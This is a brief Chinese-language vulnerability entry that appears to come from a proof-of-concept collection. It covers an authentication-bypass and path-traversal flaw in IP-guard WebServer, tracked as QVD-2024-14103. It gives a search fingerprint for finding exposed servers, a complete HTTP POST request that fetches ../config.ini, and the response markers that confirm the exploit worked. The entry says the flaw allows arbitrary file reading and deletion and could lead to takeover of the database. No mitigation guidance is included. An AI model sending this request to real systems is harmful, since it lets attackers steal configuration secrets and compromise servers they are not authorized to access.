﻿# IP-guard WebServer 权限绕过漏洞

> 更新时间：2024-04-19

> 漏洞编号：QVD-2024-14103

> 漏洞说明：该漏洞的成功利用允许攻击者规避安全验证，通过后端接口执行文件的任意读取和删除操作。利用这一漏洞，攻击者有可能获取数据库的配置详情，并控制整个数据库系统。

> 漏洞特征：icon_hash="2030860561"

> 验证脚本：HTTP

```
POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded


path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```

> 响应代码特征：200

> 响应内容特征：host

> 上传文件定位：

> 验证文件来源：IP-guard WebServer 权限绕过漏洞.poc

